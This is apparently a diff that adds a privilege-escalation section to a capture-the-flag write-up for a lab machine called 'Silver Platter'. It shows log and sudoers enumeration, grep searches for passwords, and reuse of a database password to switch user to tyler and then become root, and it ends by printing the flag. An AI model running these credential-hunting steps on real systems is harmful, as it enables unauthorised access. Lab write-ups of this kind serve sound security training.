@@ -315,8 +315,210 @@ tim@ip-10-10-30-149:~$ cd /tmp
 tim@ip-10-10-30-149:/tmp$ ls -lad
 drwxrwxrwt 12 root root 4096 Jul 23 01:24 .
 ```
+
 Notice that everybody can do pretty much anything in this directory.
+
+# Privilege Escalation
+
+In order to find the root flag, we need to become the administrator (root) of this machine.
+We start typing a few commands.
+
+## id
+tim is part of the adm group, that means he has access to log files:
+
+```
+tim@silver-platter:~$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+```
+
+# ## sudo -l
+But tim is not part of the sudo group, hence time cannot run sudo:
+
+```
+tim@silver-platter:~$ sudo -l    # 
+[sudo] password for tim: 
+Sorry, user tim may not run sudo on silver-platter.
+```
+
+# users
+We can look for more users on this machine:
+
+```
+tim@ip-10-10-30-149:/tmp$ ls -la /home
+total 24
+drwxr-xr-x  6 root     root     4096 Jul 21 20:10 .
+drwxr-xr-x 19 root     root     4096 Jul 23 01:18 ..
+drwxr-x---  2 ssm-user ssm-user 4096 Jul 20 17:05 ssm-user
+dr-xr-xr-x  2 root     root     4096 Dec 13  2023 tim
+drwxr-x---  5 tyler    tyler    4096 Dec 13  2023 tyler
+drwxr-x---  4 ubuntu   ubuntu   4096 Jul 21 20:10 ubuntu
+tim@ip-10-10-30-149:/tmp$ ls -al /home/tyler
+ls: cannot open directory '/home/tyler': Permission denied
+```
+
+It appears that there is a new user named tyler, so we look for what groups tyler belongs to:
+
+```
+tim@silver-platter:~$ id tyler
+uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+```
+
+Important groups:
+- tyler, like tim, is part of adm
+- tyler is part of sudo, so if we can become tyler, we can automatically also become root (!)
+
+## Check logs
+User tyler might be the intended escalation path, or there might be information in the logs about tyler's activities, either way, since for the time being we are still tim and we are part of adm, we can check the logs looking for more information:
+
+```
+## Check Log Files for tyler Activity
+
+# Look for tyler in authentication logs
+grep -r "tyler" /var/log/ 2>/dev/null
+
+# Check for any login attempts or sudo usage by tyler
+grep -r "sudo" /var/log/ 2>/dev/null | grep tyler
+grep -r "su " /var/log/ 2>/dev/null | grep tyler
+
+
+## Explore What adm Group Can Access
+
+# Find all files readable by adm group
+find / -group adm -type f 2>/dev/null
+
+# Check for any backup files that might contain user info
+find /var/backups -type f -readable 2>/dev/null
+ls -la /var/backups/
+
+# Look for any configuration files accessible to adm
+find /etc -group adm -type f 2>/dev/null
+
+
+## Check for Silverpeas/Web Application Logs
+## (since you gained access through Silverpeas, there might be logs with useful information)
+
+# Look for web server logs
+ls -la /var/log/apache2/ 2>/dev/null
+ls -la /var/log/nginx/ 2>/dev/null
+
+# Check for any application-specific logs
+find /var/log -name "*silver*" -type f 2>/dev/null
+find /var/log -name "*tomcat*" -type f 2>/dev/null
+find /var/log -name "*java*" -type f 2>/dev/null
+
+# Look for any logs that might contain passwords or credentials
+find /var/log -type f -readable 2>/dev/null -exec grep -l "password\|passwd\|credential\|secret" {} \; 2>/dev/null
+
+
+## Check System Information
+
+# Look at recent system activity
+last -n 20
+w
+who
+
+# Check for any interesting processes running as other users
+ps aux | grep tyler
+ps aux | grep root
+```
+
+Key Findings from the Logs:
+1. Tyler has sudo privileges: The logs show tyler successfully running **sudo su** multiple times to become root.
+2. Tyler created the tim user: Tyler ran sudo useradd tim and sudo passwd tim .
+3. Tyler added tim to adm group: Tyler ran sudo usermod -aG adm tim .
+
+### The Path Forward
+
+Since tyler has sudo privileges and can become root, we need to find a way to either:
+1. Get tyler's password to SSH as tyler (like we did for tim by looking at Silverpeas’ scr1ptkiddy’s notifications).
+2. Look for tyler's credentials in the logs or other files.
+
+## tyler’s password
+
+```
+# Look for tyler's password in logs or config files
+grep -r "tyler" /var/log/ 2>/dev/null | grep -i "password\|passwd"
+
+# Check if there are any readable files in tyler's directory or hints about tyler's password
+find /home/tyler -readable 2>/dev/null
+
+# Look for any sudo configuration that might help
+cat /etc/sudoers 2>/dev/null
+cat /etc/sudoers.d/* 2>/dev/null
+
+# Check for any SSH keys or configuration
+find /home/tyler/.ssh -readable 2>/dev/null
+
+# Look for any scripts or files that might contain tyler's credentials
+find /var/log -type f -readable 2>/dev/null -exec grep -l "tyler.*password\|password.*tyler" {} \; 2>/dev/null
+```
+
+Key Findings:
+1. Tyler has sudo privileges and was created during system installation.
+2. PostgreSQL’s password found as _Zd_zx7N823/ (from the  and Silverpeas Docker containers).
+
+When we find a password for a user, it is always a good idea to check whether such user did password reuse: for instance, in this case we are hoping that the user of tyler has the same password for PostgresSQL as for his ssh user:
+
+```
+# Let's hope that tyler's user reused the same password he also used for the database
+tim@silver-platter:~$ su tyler    # _Zd_zx7N823/
+Password: 
+tyler@silver-platter:/home/tim$ whoami
+tyler
+```
+
+It worked, we are tyler!
+
+Now, we can simply use tyler’s password to sudo -i our way into becoming root:
+
+```
+tyler@silver-platter:~$ id
+uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+tyler@silver-platter:/home/tim$ sudo -i    # _Zd_zx7N823/
+[sudo] password for tyler: 
+root@silver-platter:~# whoami
+root
+root@silver-platter:~# ls -la
+total 48
+drwx------  5 root root 4096 May  1  2024 .
+drwxr-xr-x 19 root root 4096 Dec 12  2023 ..
+-rw-------  1 root root  287 May  8  2024 .bash_history
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+-rw-------  1 root root   20 Dec 13  2023 .lesshst
+drwxr-xr-x  3 root root 4096 Dec 13  2023 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r--r--  1 root root   38 Dec 13  2023 root.txt
+-rw-r--r--  1 root root   66 Dec 13  2023 .selected_editor
+drwx------  3 root root 4096 Dec 12  2023 snap
+drwx------  2 root root 4096 Dec 12  2023 .ssh
+-rwxr-xr-x  1 root root   97 Dec 13  2023 start_docker_containers.sh
+-rw-r--r--  1 root root    0 Dec 13  2023 .sudo_as_admin_successful
+root@silver-platter:~# cat root.txt 
+THM{098f6bcd4621d373cade4e832627b4f6}
+```
+
+And we found the root flag as well!
+
+# How we did it
+1. Initially, we got our foot in the door by SSH'ing as tim (a user with very low privileges):
+    1. the username scr1ptkiddy found on the Contact section of the web site on http://silverplatter.thm:80
+    2. the password found through Silverpeas’ IDOR exploitation
+2. We got the user flag!
+3. Enumeration: used tim’s adm group privileges to read log files in /var/log/
+4. Information Gathering: Found tyler's Docker commands containing the database password _Zd_zx7N823/
+5. Lateral Movement: used su tyler with the reused password _Zd_zx7N823/
+6. Privilege Escalation: Used sudo -i as tyler (who has sudo privileges) with the same password_Zd_zx7N823/
+7. Root Access: Successfully obtained root shell and retrieved the root flag!
+
 
 
 # Lessons Learned
-Key takeaways from this challenge...
+Key learning points:
+1. Log File Analysis: The adm group membership was crucial for accessing authentication logs.
+2. Password Reuse: Tyler reused the database password for his user account - a common security mistake.
+3. Sudo Privileges: Tyler had full sudo access, making the escalation straightforward once you had his password.
+4. Information Disclosure: Docker commands in logs revealed sensitive passwords.
+
+This was a great example of how proper enumeration and log analysis can lead to successful privilege escalation.
+
+The "Silver Platter" name was quite fitting - once we found the right logs, the escalation path was relatively straightforward!
